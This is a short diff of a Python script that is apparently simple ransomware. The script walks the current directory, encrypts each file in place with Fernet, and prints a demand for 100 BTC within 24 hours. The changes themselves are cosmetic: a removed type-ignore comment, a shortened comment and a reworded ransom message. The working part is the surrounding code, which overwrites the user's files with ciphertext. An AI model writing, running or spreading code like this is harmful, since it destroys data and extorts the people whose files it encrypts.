@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 import os
-from cryptography.fernet import Fernet  # type: ignore
+from cryptography.fernet import Fernet
 
-# Let's find some files!
+# Let's find some files
 files = []
 
 for file in os.listdir():
@@ -25,4 +25,7 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("Your files are encrypted! Send 100 BTC or they're gone in 24 hours.")
+print(
+    "All of your files have encrypted! Send me 100 BTC "
+    "or they will all be gone in 24 hours forever! ☠️"
+)
